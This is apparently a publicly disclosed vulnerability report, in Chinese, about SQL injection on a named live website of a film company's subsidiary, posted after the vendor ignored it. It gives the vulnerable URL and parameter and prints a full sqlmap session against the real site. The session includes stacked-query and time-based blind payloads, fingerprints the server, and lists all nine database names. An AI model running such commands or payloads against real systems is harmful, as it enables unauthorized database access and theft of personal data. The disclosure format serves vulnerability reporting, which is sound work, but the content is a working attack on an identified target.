wybug_title: 华谊兄弟旗下某公司 # SQL注射漏洞 (存在敏感信息)
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2013-11-04：	积极联系厂商并且等待厂商认领中，细节不对外公开									2013-12-19：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 可能会泄露签约明星资料哦。。安全做的不到位呀。 详细说明：  可能会泄露签约明星资料哦  SQL注射存在"/news/visitcount.aspx"里。后面跟个"?ID=1"
http://www.hbstars.com//news/visitcount.aspx?ID=1
丢到SQLMAP
root@kali:~# sqlmap -u http://www.hbstars.com:80/news/visitread.aspx?ID=1 --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 00:56:49[00:56:49] [INFO] resuming back-end DBMS 'microsoft sql server' [00:56:49] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: ID=1; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ID=1 WAITFOR DELAY '0:0:5'-----[00:56:49] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[00:56:49] [INFO] fetching database names[00:56:49] [INFO] fetching number of databases[00:56:49] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[00:56:58] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based payloads[00:57:08] [INFO] adjusting time delay to 1 second due to good response times9[00:57:09] [INFO] retrieved: HBS[00:57:21] [INFO] retrieved: master[00:57:51] [INFO] retrieved: model[00:58:18] [INFO] retrieved: msdb[00:58:38] [INFO] retrieved: ReportServer[00:59:39] [INFO] retrieved: ReportServerTempDB[01:01:09] [INFO] retrieved: tempdb[01:01:42] [INFO] retrieved: WXJJ[01:02:02] [INFO] retrieved: WXJJ_NEWavailable databases [9]:[*] HBS[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] WXJJ[*] WXJJ_NEW[01:02:41] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/www.hbstars.com'[*] shutting down at 01:02:41root@kali:~#
